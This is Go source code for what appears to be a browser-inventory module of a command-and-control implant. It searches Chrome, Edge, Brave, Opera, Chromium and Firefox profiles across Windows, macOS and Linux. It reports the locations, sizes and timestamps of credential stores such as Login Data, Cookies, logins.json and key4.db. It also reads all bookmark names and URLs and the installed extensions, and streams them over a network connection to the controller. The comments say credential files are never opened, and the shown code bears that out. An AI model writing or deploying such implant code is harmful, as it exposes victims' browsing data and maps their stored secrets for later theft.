package main

import (
	"encoding/json"
	"net"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"

	"c2-platform/internal/protocol"
)

// Browser inventory: profile artifacts, bookmarks and extensions.
// Read-only; credential stores (Login Data / Cookies / logins.json) are only
// reported as file metadata and never opened or decrypted.
//
// Row format: kind \t browser \t profile \t b \t c \t size
//   F  file artifact (b=name, c=mtime)   V  version (b=version)
//   B  bookmark (b=name, c=url)          E  extension (b=id, c=version)

type browserRoot struct {
	name    string
	path    string
	firefox bool
}

var chromiumFiles = []string{"History", "Bookmarks", "Cookies", "Login Data", "Web Data", "Preferences"}
var firefoxFiles = []string{"places.sqlite", "cookies.sqlite", "logins.json", "key4.db", "prefs.js"}

func browserRoots() []browserRoot {
	home, _ := os.UserHomeDir()
	switch runtime.GOOS {
	case "windows":
		local := os.Getenv("LOCALAPPDATA")
		roaming := os.Getenv("APPDATA")
		return []browserRoot{
			{"Chrome", filepath.Join(local, "Google", "Chrome", "User Data"), false},
			{"Edge", filepath.Join(local, "Microsoft", "Edge", "User Data"), false},
			{"Brave", filepath.Join(local, "BraveSoftware", "Brave-Browser", "User Data"), false},
			{"Chromium", filepath.Join(local, "Chromium", "User Data"), false},
			{"Opera", filepath.Join(roaming, "Opera Software", "Opera Stable"), false},
			{"Firefox", filepath.Join(roaming, "Mozilla", "Firefox", "Profiles"), true},
		}
	case "darwin":
		sup := filepath.Join(home, "Library", "Application Support")
		return []browserRoot{
			{"Chrome", filepath.Join(sup, "Google", "Chrome"), false},
			{"Edge", filepath.Join(sup, "Microsoft Edge"), false},
			{"Brave", filepath.Join(sup, "BraveSoftware", "Brave-Browser"), false},
			{"Chromium", filepath.Join(sup, "Chromium"), false},
			{"Firefox", filepath.Join(sup, "Firefox", "Profiles"), true},
		}
	default:
		cfg := os.Getenv("XDG_CONFIG_HOME")
		if cfg == "" {
			cfg = filepath.Join(home, ".config")
		}
		return []browserRoot{
			{"Chrome", filepath.Join(cfg, "google-chrome"), false},
			{"Chromium", filepath.Join(cfg, "chromium"), false},
			{"Edge", filepath.Join(cfg, "microsoft-edge"), false},
			{"Brave", filepath.Join(cfg, "BraveSoftware", "Brave-Browser"), false},
			{"Firefox", filepath.Join(home, ".mozilla", "firefox"), true},
		}
	}
}

func bLine(c net.Conn, kind, browser, a, b, cc string, size int64) {
	line := strings.Join([]string{kind, browser, a, b, cc, strconv.FormatInt(size, 10)}, "\t") + "\n"
	_ = writeFrame(c, protocol.RspData, []byte(line))
}

func handleBrowser(c net.Conn) {
	for _, br := range browserRoots() {
		entries, err := os.ReadDir(br.path)
		if err != nil {
			continue
		}
		files := chromiumFiles
		if br.firefox {
			files = firefoxFiles
		}
		for _, e := range entries {
			if !e.IsDir() || strings.HasPrefix(e.Name(), ".") {
				continue
			}
			if !br.firefox && e.Name() != "Default" && !strings.HasPrefix(e.Name(), "Profile") {
				continue
			}
			profile := filepath.Join(br.path, sanitize(e.Name()))
			for _, name := range files {
				info, err := os.Stat(filepath.Join(profile, name))
				if err != nil || info.IsDir() {
					continue
				}
				bLine(c, "F", br.name, sanitize(e.Name()), name, strconv.FormatInt(info.ModTime().Unix(), 10), info.Size())
			}
			if br.firefox {
				continue
			}
			bookmarks(c, br.name, sanitize(e.Name()), profile)
			extensions(c, br.name, sanitize(e.Name()), profile)
		}
		if !br.firefox {
			if v, err := os.ReadFile(filepath.Join(br.path, "Last Version")); err == nil {
				if s := strings.TrimSpace(string(v)); s != "" {
					bLine(c, "V", br.name, "-", s, "0", 0)
				}
			}
		}
	}
	_ = writeFrame(c, protocol.RspEnd, nil)
}

type bmNode struct {
	Name     string   `json:"name"`
	URL      string   `json:"url"`
	Children []bmNode `json:"children"`
}

func bookmarks(c net.Conn, browser, profileName, profilePath string) {
	b, err := os.ReadFile(filepath.Join(profilePath, "Bookmarks"))
	if err != nil || len(b) > 4*1024*1024 {
		return
	}
	var root struct {
		Roots map[string]bmNode `json:"roots"`
	}
	if json.Unmarshal(b, &root) != nil {
		return
	}
	var walk func(bmNode)
	walk = func(n bmNode) {
		if n.URL != "" {
			bLine(c, "B", browser, profileName, n.Name, n.URL, 0)
		}
		for _, ch := range n.Children {
			walk(ch)
		}
	}
	for _, key := range []string{"bookmark_bar", "other", "synced"} {
		if n, ok := root.Roots[key]; ok {
			walk(n)
		}
	}
}

func extensions(c net.Conn, browser, profileName, profilePath string) {
	ids, err := os.ReadDir(filepath.Join(profilePath, "Extensions"))
	if err != nil {
		return
	}
	for _, id := range ids {
		if !id.IsDir() {
			continue
		}
		versions, err := os.ReadDir(filepath.Join(profilePath, "Extensions", id.Name()))
		if err != nil {
			continue
		}
		for _, ver := range versions {
			if !ver.IsDir() {
				continue
			}
			b, err := os.ReadFile(filepath.Join(profilePath, "Extensions", id.Name(), ver.Name(), "manifest.json"))
			if err != nil || len(b) > 256*1024 {
				continue
			}
			var man struct {
				Name    string `json:"name"`
				Version string `json:"version"`
			}
			_ = json.Unmarshal(b, &man)
			if man.Name == "" {
				man.Name = id.Name()
			}
			if man.Version == "" {
				man.Version = ver.Name()
			}
			bLine(c, "E", browser, profileName, sanitize(man.Name), sanitize(man.Version), 0)
		}
	}
}

func sanitize(s string) string {
	return strings.Map(func(r rune) rune {
		if r == '\t' || r == '\n' || r == '\r' {
			return -1
		}
		return r
	}, s)
}
